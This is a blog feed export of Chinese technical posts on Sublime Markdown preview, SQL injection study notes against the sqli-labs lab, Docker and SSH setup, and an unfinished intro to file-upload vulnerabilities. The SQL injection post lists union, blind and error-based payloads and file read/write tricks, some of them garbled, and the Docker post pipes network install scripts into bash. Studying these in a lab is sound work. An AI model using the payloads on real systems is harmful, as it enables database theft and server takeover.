<p>3 出现两个选项：github和markdown。任选其一即可，github是利用GitHub的在线API来解析.md文件，支持在线资源的预览，如在线图片它的解析速度取决于你的联网速度。该方式据说一天只能打开60次。markdown就是传统的本地打开，不支持在线资源的预览。</p>
<p>4 默认浏览器中显示预览结果</p>
<h6 id="将md文件用浏览器预览——2-用快捷键打开"><a href="#将md文件用浏览器预览——2-用快捷键打开" class="headerlink" title="将md文件用浏览器预览——2.用快捷键打开"></a>将md文件用浏览器预览——2.用快捷键打开</h6><p>Sublime Text支持自定义快捷键，Markdown </p>
<p>Preview默认没有快捷键，我们可以自己为Markdown Preview： Preview in Browser设置快捷键。</p>
<p>方法是在Preferences -&gt; Key Bindings打开的文件的右侧栏的中括号中添加一行代码：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;alt+m&quot;</span>],  </span><br><span class="line">    <span class="attr">&quot;command&quot;</span>:<span class="string">&quot;markdown_preview&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;args&quot;</span>: </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;target&quot;</span>: <span class="string">&quot;browser&quot;</span>,      </span><br><span class="line">            <span class="attr">&quot;parser&quot;</span>:<span class="string">&quot;markdown&quot;</span></span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里：</p>
<blockquote>
<p>“alt+m” 可设置为自己喜欢的按键。”parser”: “markdown”也可设置为”parser”:”github”，改为使用Github在线API解析markdown</p>
</blockquote>
<p>以上两种方式都有个问题：每次预览都要打开一个新的网页，而且需要手动操作。有没有一个方法，可以打开一个网页后，之后再也不用管，让它实时刷新预览呢？</p>
<p>有，还很简单，答案就是MarkdownPreview+LiveReload！<br>LiveReload是一个可实时刷新的插件，不仅可用于Markdown，也可用于HTML等。</p>
<h5 id="最强）实时自动刷新预览：MarkdownPreview-LiveReload"><a href="#最强）实时自动刷新预览：MarkdownPreview-LiveReload" class="headerlink" title="(最强）实时自动刷新预览：MarkdownPreview+LiveReload"></a>(最强）实时自动刷新预览：MarkdownPreview+LiveReload</h5><p><strong>先安装并配置Markdown Preview</strong></p>
<p>如前Markdown Preview安装成功后，设置前文所述的快捷键（如需），打开其配置文件 Preferences -&gt; Package Settings -&gt; Markdown Preview -&gt; Settings，检查左侧enable_autoreload条目是否为true，若是，跳过。若不是，右侧栏加一条下面这个后重启Sublime:<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;enable_autoreload&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>安装并配置LiveReload</strong></p>
<p>Ctrl+Shift+p, 输入 Install Package，输入LiveReload, 回车安装</p>
<p>安装成功后, 再次Ctrl+shift+p, 输入LiveReload: Enable/disable plug-ins, 回车, 选择 Simple Reload with delay (400ms)或者Simple Reload，两者的区别仅仅在于后者没有延迟。</p>
<p><strong>开始使用</strong></p>
<p>原文链接：<a href="https://blog.csdn.net/qq_20011607/article/details/81370236">https://blog.csdn.net/qq_20011607/article/details/81370236</a></p>
]]></content>
      <categories>
        <category>软件安装</category>
      </categories>
      <tags>
        <tag>软件安装</tag>
      </tags>
  </entry>
  <entry>
    <title>Web漏洞-SQL注入</title>
    <url>/2021/11/17/Web%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库</p>
<p><img src="/2021/11/17/Web%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5/SQL注入.png" alt="photo"></p>
<h2 id="SQL注入产生的原理"><a href="#SQL注入产生的原理" class="headerlink" title="SQL注入产生的原理"></a>SQL注入产生的原理</h2><ol>
<li>对用户输入的参数没有进行严格过滤（如过滤单双引号 尖括号等），就被带到数据库执行，造成了SQL注入</li>
<li>使用了字符串拼接的方式构造SQL语句</li>
</ol>
<h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><ol>
<li>从注入手法分类可以分为：联合查询注入、报错型注入、布尔型注入、延时注入、堆叠注入</li>
<li>从数据类型上可以分为：字符型（即输入的输入使用符号进行过滤）、数值型（即输入的输入未使用符号进行过滤）</li>
<li>从注入位置可以分类为：GET数据（提交数据方式为GET，大多存在地址栏）、POST数据（提交数据方式为POST，大多存在输入框中）、HTTP头部（提交数据方式为HTTP头部）、cookie数据（提交数据方式为cookie）</li>
</ol>
<h2 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h2><p>分为两类：危害数据库里的数据、直接危害到网站的权限(需要满足条件)</p>
<ol>
<li>数据库信息泄露</li>
<li>网页篡改：登陆后台后发布恶意内容</li>
<li>网站挂马 : 当拿到webshell时或者获取到服务器的权限以后，可将一些网页木马挂在服务器上，去攻击别人</li>
<li>私自添加系统账号</li>
<li>读写文件获取webshell</li>
</ol>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><p>information_schema.schemata 记录所有数据库名<br>information_schema.tables：记录所有表名信息的表<br>information_schema.columns：记录所有列名信息的表<br>schema_name 数据库名<br>table_name：表名<br>column_name：列名<br>table_schema：数据库名<br>system_user() 查看当前Mysqlsql登录用户名，同下<br>user()  查看当前MySQL登录的用户名<br>database()   查看当前使用MySQL数据库名<br>version()  查看当前MySQL版本<br>@@version_compile_os 查看操作系统<br>@@HOSTNAME 主机名称<br>@@datadir 数据库路径</p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ol>
<li>floor() 向下取整</li>
<li>rand() 返回一个大于0小于1的浮点数</li>
<li>length(str) 返回字符串长度</li>
<li>ascii(str) 返回字符串str的最左面字符的ASCII代码值，如果str是空字符串，返回0；如果str是NULL，返回NULL</li>
<li>load_file() 读取本地文件 用法：select load_file(‘C:\phpstudy\www\sqli\Less-7\text.txt’);<a href="https://www.yuque.com/docs/share/8c58e841-32da-4c7e-a3ac-394f294a2aa6?">Mysql注入load_file常用路径</a></li>
<li>into outfile 写文件 用法：select ‘mysql is good’ into outfile ‘test.txt’;</li>
<li>if(condition,A,B)如果条件condition为true，则执行A，否则执行B</li>
<li>chr(数字),ord(‘字母’) python中将字符或布尔类型转成ascii码</li>
</ol>
<h3 id="字符串拼接函数"><a href="#字符串拼接函数" class="headerlink" title="字符串拼接函数"></a>字符串拼接函数</h3><ol>
<li>concat(str1,str2..)函数 没有分隔符串联多列结果</li>
<li>concat_ws(separator,str1,str2,…) 含有分隔符串联多列结果</li>
<li>group_concat(str1,str2,str3…) 用逗号，串联多行结果为一行</li>
<li>order by关键字(select * from table_name order by 3)表示按第三列排序</li>
<li>left(str,len) 对指定字符串从左边截取指定长度，正确返回1，错误返回0</li>
<li>right(str,len)对指定字符串从右边截取指定长度</li>
<li>substr(str,start,length)对于给定字符串，从start为开始截取length长度，如substr(“chinese”,3,2)=”in”.类似的还有substring()、mid()用法功能一致</li>
<li>regexp函数 匹配正则</li>
</ol>
<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>数字型</strong><br>通过2-1与1的回显结果判断是否为数字型注入。有可能被()或者(())括起来</p>
<p><strong>字符型</strong><br>用单引号和双引号进行闭合。也有可能被(),(())包裹</p>
<p><img src="/2021/11/17/Web%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5/MYSQL注入利用.png" alt="photo"></p>
<h2 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h2><p>Mysql在5.0以上版本加入了 information_schema 这个系统自带库 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等</p>
<h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><ol>
<li>判断字段数目order by 4…</li>
<li>判断显示位 union select 1,2,3,4…</li>
<li>查看当前数据库union select 1,2,database()</li>
<li>查表名union select 1,2,table_name from information_schema.tables where table_schema=database()</li>
<li>查列名union select 1,2,column_name from information_schema.columns where table_name=’表名’ and table_schema=database()</li>
<li>查询字段值union select 1,字段名,字段名 from 表名</li>
</ol>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>这里主要使用mid(),substr(),left()这几个函数来截取字符串慢慢尝试</p>
<ol>
<li>猜解当前数据库名称长度 and (length(database()))&gt;1</li>
<li>通过<a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and left((select database()),1)=’s’—+ 判断第一位是否是s，然后可以用bp逐步进行爆破处理</li>
<li>或者使用if来判断测试<a href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;156—+来通过二分法逐步判断</li>
<li>之后就是正常的注入流程，不断的猜表名、猜字段名和猜内容</li>
</ol>
<h3 id="基于时间的SQL盲注"><a href="#基于时间的SQL盲注" class="headerlink" title="基于时间的SQL盲注"></a>基于时间的SQL盲注</h3><p>一般来说，在页面没有任何回显和错误信息提示的时候，我们就会测试时间盲注的方法</p>
<p>主要通过if(length(database())=8,1,sleep())这样来判断语句是否注入成功<br>之后就是类似于布尔盲注的形式进行判定注入</p>
<p>例：/?id = 1’ and if((substr((select schema_name from information_schema.schmata limit 4,1),1,8)=’security’),1,sleep(5))—+</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor()报错"></a>floor()报错</h3><blockquote>
<p>and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);</p>
</blockquote>
<h3 id="通过ExtractValue报错"><a href="#通过ExtractValue报错" class="headerlink" title="通过ExtractValue报错"></a>通过ExtractValue报错</h3><blockquote>
<p>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
</blockquote>
<h3 id="通过UpdateXml报错"><a href="#通过UpdateXml报错" class="headerlink" title="通过UpdateXml报错"></a>通过UpdateXml报错</h3><blockquote>
<p>and updatexml(1,concat(0x5c,(select user()),0x5c),1)</p>
</blockquote>
<p>其中concat函数是将其连接成一个字符串，因此不会符合XPath_string的格式，从而出现格式错误，爆出ERROR 1105 (HY000): XPATH syntax error: root@localhost</p>
<p>updatexml()函数</p>
<p>UPDATEXML(XML_document,XPath_string,new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string(Xpath格式的字符串)<br>第三参数：new_value,String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
<h3 id="通过NAME-CONST报错注入"><a href="#通过NAME-CONST报错注入" class="headerlink" title="通过NAME_CONST报错注入"></a>通过NAME_CONST报错注入</h3><blockquote>
<p>and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p>
</blockquote>
<h3 id="通过join报错注入"><a href="#通过join报错注入" class="headerlink" title="通过join报错注入"></a>通过join报错注入</h3><blockquote>
<p>select <em> from (select </em> from mysql.user a join mysql.user b)c;</p>
</blockquote>
<h3 id="通过exp报错注入"><a href="#通过exp报错注入" class="headerlink" title="通过exp报错注入"></a>通过exp报错注入</h3><blockquote>
<p>and exp(~(select * from (select user()) a) );</p>
</blockquote>
<h3 id="通过GeometryCollection-报错注入"><a href="#通过GeometryCollection-报错注入" class="headerlink" title="通过GeometryCollection()报错注入"></a>通过GeometryCollection()报错注入</h3><blockquote>
<p>and GeometryCollection(()select *from(select user() )a)b;</p>
</blockquote>
<h3 id="通过ploygon-报错注入"><a href="#通过ploygon-报错注入" class="headerlink" title="通过ploygon()报错注入"></a>通过ploygon()报错注入</h3><blockquote>
<p>and polygon (()select * from(select user())a)b;</p>
</blockquote>
<h3 id="通过multipoint-报错注入"><a href="#通过multipoint-报错注入" class="headerlink" title="通过multipoint()报错注入"></a>通过multipoint()报错注入</h3><blockquote>
<p>and multipoint (()select * from(select user() )a)b;</p>
</blockquote>
<h3 id="通过multingestring-报错注入"><a href="#通过multingestring-报错注入" class="headerlink" title="通过multingestring()报错注入"></a>通过multingestring()报错注入</h3><blockquote>
<p>and multlinestring (()select * from(select user() )a)b;</p>
</blockquote>
<h3 id="通过multpolygon-报错注入"><a href="#通过multpolygon-报错注入" class="headerlink" title="通过multpolygon()报错注入"></a>通过multpolygon()报错注入</h3><blockquote>
<p>and multpolygon (()select * from(select user() )a)b;</p>
</blockquote>
<h3 id="通过linestring-报错注入"><a href="#通过linestring-报错注入" class="headerlink" title="通过linestring()报错注入"></a>通过linestring()报错注入</h3><blockquote>
<p>and linestring (()select * from(select user() )a)b;</p>
</blockquote>
<h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><h3 id="头部POST注入"><a href="#头部POST注入" class="headerlink" title="头部POST注入"></a>头部POST注入</h3><p><strong>常用的请求头</strong></p>
<ul>
<li><p>HostHost<br>  Host请求报头域主要用于指定被请求资源的Internet主机和端口号。<br>  如：Host: localhost:8088</p>
</li>
<li><p>User-Agent<br>  User-Agent请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。登录一些网站时，很多时候都可以见到显示我们的浏览器、系统信息，这些都是此头的作用。<br>  如：User-Agent: Mozilla/5.0</p>
</li>
<li><p>Referer<br>  Referer包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。<br>  如：Referer: <a href="http://192.168.33.1/sqli/Less-18/">http://192.168.33.1/sqli/Less-18/</a></p>
</li>
<li><p>Cookie<br>  Cookie是非常重要的请求头，它是一段文本，常用来表示请求者身份等。<br>  如：Cookie: username=admin; password=admin</p>
</li>
<li><p>Range<br>  Range可以请求实体的部分内容，多线程下载一定会用到此请求头。<br>  如：表示头500字节：Range: bytes=0~499<br>    表示第二个500字节：Range: bytes=500~999<br>    表示最后500字节：Range: bytes=-500<br>    表示500字节以后的范围：Range: bytes=500-</p>
</li>
<li><p>X-Forwarded-For<br>  X-Forwarded-For即XXF头，它代表请求端的IP，可以有多个，中间以逗号隔开。<br>  如：X-Forwarded-For: 8.8.8.8</p>
</li>
<li><p>Accept<br>  Accept请求报头域用于指定客户端接收哪些MIME类型的信息。<br>  如：Accept: text/html</p>
</li>
<li><p>Accept-Charset<br>  Accept-Charset请求报头域用于指定客户端接收的字符集。如果在请求消息中没有设置这个域，默认是任何字符集都可以接收。<br>  如： Accept-Charset: gb2312</p>
</li>
</ul>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h2 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h2><p>通过sqli-labs进行学习<br>学习参考视频：<a href="https://www.bilibili.com/video/BV1e441127Rd">https://www.bilibili.com/video/BV1e441127Rd</a></p>
]]></content>
      <tags>
        <tag>Web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu搭建docker环境</title>
    <url>/2021/11/22/Ubuntu%E6%90%AD%E5%BB%BAdocker%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>本文采用阿里云ECS服务器实例来进行搭建docker环境</p>
<h2 id="连接阿里云服务器"><a href="#连接阿里云服务器" class="headerlink" title="连接阿里云服务器"></a>连接阿里云服务器</h2><p>通过xshell或者其他shell工具连接阿里云服务器</p>
<h2 id="使用APT安装"><a href="#使用APT安装" class="headerlink" title="使用APT安装"></a>使用APT安装</h2><p>由于 apt 源使用 HTTPS 以确保软件下载过程中不被篡改。因此，我们首先需要添加使用 HTTPS 传输的软件包以及 CA 证书</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br></pre></td></tr></table></figure>
<p>鉴于国内网络问题，强烈建议使用国内源，官方源请在注释中查看</p>
<p>为了确认所下载软件包的合法性，需要添加软件源的 GPG 密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br><span class="line"># 官方源</span><br><span class="line"># $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure>
<p>然后，我们需要向 sources.list 中添加 Docker 软件源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo \</span><br><span class="line">    &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/ubuntu \</span><br><span class="line">    $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line"># 官方原</span><br><span class="line"># $ echo \</span><br><span class="line">    #   &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span><br><span class="line">#   $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure>
<blockquote>
<p>以上命令会添加稳定版本的 Docker APT 镜像源，如果需要测试版本的 Docker 请将 stable 改为 test</p>
</blockquote>
<h2 id="使用官方安装脚本自动安装"><a href="#使用官方安装脚本自动安装" class="headerlink" title="使用官方安装脚本自动安装"></a>使用官方安装脚本自动安装</h2><p>在测试或开发环境中 Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，Ubuntu 系统上可以使用这套脚本安装，另外可以通过 —mirror 选项使用国内源进行安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>
<p>执行这个命令后，脚本就会自动的将一切准备工作做好，并且把 Docker 的稳定(stable)版本安装在系统中</p>
<p>也可以使用国内 daocloud 一键安装命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure>
<h2 id="启动Docker"><a href="#启动Docker" class="headerlink" title="启动Docker"></a>启动Docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl enable docker</span><br><span class="line">$ sudo systemctl start docker</span><br></pre></td></tr></table></figure>
<h2 id="建立docker用户组"><a href="#建立docker用户组" class="headerlink" title="建立docker用户组"></a>建立docker用户组</h2><p>默认情况下，docker 命令会使用 Unix socket与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组</p>
<p>建立<code>docker</code>组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo groupadd docker</span><br></pre></td></tr></table></figure>
<p>将当前用户加入<code>docker</code>组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo usermod -aG docker $USER</span><br></pre></td></tr></table></figure>
<p>退出当前终端并重新登录，进行如下测试</p>
<h2 id="测试Docker是否安装正确"><a href="#测试Docker是否安装正确" class="headerlink" title="测试Docker是否安装正确"></a>测试Docker是否安装正确</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker run --rm hello-world</span><br><span class="line"></span><br><span class="line">Unable to find image &#x27;hello-world:latest&#x27; locally</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">2db29710123e: Pull complete </span><br><span class="line">Digest: sha256:cc15c5b292d8525effc0f89cb299f1804f3a725c8d05e158653a563f15e4f685</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"> $ docker run -it ubuntu bash</span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https://hub.docker.com/</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https://docs.docker.com/get-started/</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Xshell和Xftp与虚拟机的连接</title>
    <url>/2020/09/28/Xshell%E5%92%8CXftp%E4%B8%8E%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E8%BF%9E%E6%8E%A5/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="Xshell"><a href="#Xshell" class="headerlink" title="Xshell"></a>Xshell</h2><p>Xshell 是一个强大的安全终端模拟软件，它支持SSH1, SSH2, 以及Microsoft Windows 平台的TELNET 协议。Xshell 通过互联网到远程主机的安全连接以及它创新性的设计和特色帮助用户在复杂的网络环境中享受他们的工作。<br>Xshell可以在Windows界面下用来访问远端不同系统下的服务器，从而比较好的达到远程控制终端的目的。</p>
<h2 id="xftp"><a href="#xftp" class="headerlink" title="xftp"></a>xftp</h2><p>Xftp是一个软件应用程序,可以帮助您通过网络传输文件。 尽管它是为工作在Windows系统上而设计的，用户还可以安全地传输文件到使用Unix /Linux系统的主机。 它还支持SFTP协议，因此所有通过该软件的网络流量都是加密的。</p>
<span id="more"></span>
<h1 id="安装和连接"><a href="#安装和连接" class="headerlink" title="安装和连接"></a>安装和连接</h1><p>Xshell和Xftp可以通过教育邮箱申请免费使用。</p>
<h2 id="虚拟机安装ssh"><a href="#虚拟机安装ssh" class="headerlink" title="虚拟机安装ssh"></a>虚拟机安装ssh</h2><p>由于xshell远程连接ubuntu是通过ssh协议的，所以，需要给虚拟机安装ssh服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ubuntu安装ssh</span><br><span class="line">sudo apt-get openssh-server （若没有ssh，首先要执行sudo apt-get install ssh）</span><br></pre></td></tr></table></figure>
<p>Centos安装ssh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install openssh-server -y(Centos 系统默认安装Openssh）</span><br></pre></td></tr></table></figure>
<p>window安装ssh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开设置-应用-应用和功能-管理可选功能-添加功能</span><br><span class="line">安装OpenSSH服务器和客户端</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/28/Xshell%E5%92%8CXftp%E4%B8%8E%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E8%BF%9E%E6%8E%A5/Image.png" alt="图片"></p>
<h2 id="启动SSH"><a href="#启动SSH" class="headerlink" title="启动SSH"></a>启动SSH</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>需要管理员模式进cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net start sshd</span><br><span class="line">OpenSSH SSH Server 服务正在启动 . OpenSSH SSH Server 服务已经启动成功。</span><br><span class="line"></span><br><span class="line">net stop sshd </span><br><span class="line">OpenSSH SSH Server 服务已成功停止。</span><br></pre></td></tr></table></figure>
<h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看是否启动</span><br><span class="line">ps -e | grep ssh</span><br><span class="line">启动</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">关闭</span><br><span class="line">sudo systemctl stop ssh</span><br><span class="line">开机启动</span><br><span class="line">sudo systemctl enable/disable ssh</span><br></pre></td></tr></table></figure>
<h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -e | grep ssh</span><br><span class="line">启动</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">关闭</span><br><span class="line">sudo systemctl stop ssh</span><br><span class="line">开机启动</span><br><span class="line">sudo systemctl enable/disable ssh</span><br></pre></td></tr></table></figure>
<h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p><strong>虚拟机网络需要是nat模式</strong></p>
<p><strong>需要主机和虚拟机可以相互ping通</strong>,可以的话继续。</p>
<p>打开xshell或xftp，点击新建。<br>名称可以自己随意填，主机填上虚拟机ip地址。<br>然后确定。<br>连接，输入用户名和密码即可。</p>
<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><h3 id="Centos-1"><a href="#Centos-1" class="headerlink" title="Centos"></a>Centos</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">临时关闭</span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">永久关闭</span><br><span class="line">systemctl disable direwalld.service</span><br></pre></td></tr></table></figure>
<h3 id="Ubuntu-1"><a href="#Ubuntu-1" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看状态</span><br><span class="line">sudo ufw status</span><br><span class="line">禁用</span><br><span class="line">sudo ufw disable</span><br><span class="line">启用</span><br><span class="line">sudo ufw enable</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux学习</category>
      </categories>
      <tags>
        <tag>Linux学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Web漏洞-文件上传</title>
    <url>/2021/11/21/Web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p><img src="/2021/11/21/Web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/WEB漏洞-文件上传.png" alt="文件上传"></p>
<h2 id="文件上传漏洞介绍"><a href="#文件上传漏洞介绍" class="headerlink" title="文件上传漏洞介绍"></a>文件上传漏洞介绍</h2><h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>凡是存在文件上传的地方均有可能存在文件上传漏洞，关于上传文件操作的时候对方代码写的是否完整、是否安全，一旦疏忽了某个地方可能会造成文件上传漏洞</p>
<h3 id="文件上传的原理"><a href="#文件上传的原理" class="headerlink" title="文件上传的原理"></a>文件上传的原理</h3><p>网站Web应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型，此时攻击者就可以上传一个webshell到一个Web可访问的目录上，并将恶意文件传递给如PHP解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。还有一部分是攻击者通过Web服务器的解析漏洞来突破Web应用程序的防护</p>
<h3 id="文件上传漏洞的危害"><a href="#文件上传漏洞的危害" class="headerlink" title="文件上传漏洞的危害"></a>文件上传漏洞的危害</h3><p>文件可以自定义，可以成为webshell，通过文件上传来上传网站后门，直接获取网站权限，属于高危漏洞。上传漏洞与SQL注入或 XSS相比 , 其风险更大 。可以获取数据库信息，可以对服务器提权，获取内网权限</p>
<h3 id="文件上传漏洞如何查找和判断"><a href="#文件上传漏洞如何查找和判断" class="headerlink" title="文件上传漏洞如何查找和判断"></a>文件上传漏洞如何查找和判断</h3><ol>
<li>黑盒查找<br>文件后台<br> 进入网站后台不一定获得网站权限，可以从后台获取网站权限<br>会员中心<br> 通过图片上传<br>文件扫描<br> 使用工具扫描出后台路径</li>
<li>白盒查找<br>通过代码分析到上传漏洞<br>查找文件上传功能</li>
</ol>
<h2 id="文件上传的实现"><a href="#文件上传的实现" class="headerlink" title="文件上传的实现"></a>文件上传的实现</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p><img src="/2021/11/21/Web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/利用思路.png" alt="利用思路"></p>
<h3 id="文件上传在实际应用中的方式"><a href="#文件上传在实际应用中的方式" class="headerlink" title="文件上传在实际应用中的方式"></a>文件上传在实际应用中的方式</h3><p><strong>方式一</strong></p>
<p> 先直接传一个PHP，实战先传马<br>实战先传一个正常的图片，看看有无返回存储地址<br>如果能直接上传并解析，已离成功不远</p>
<p><strong>方式二</strong></p>
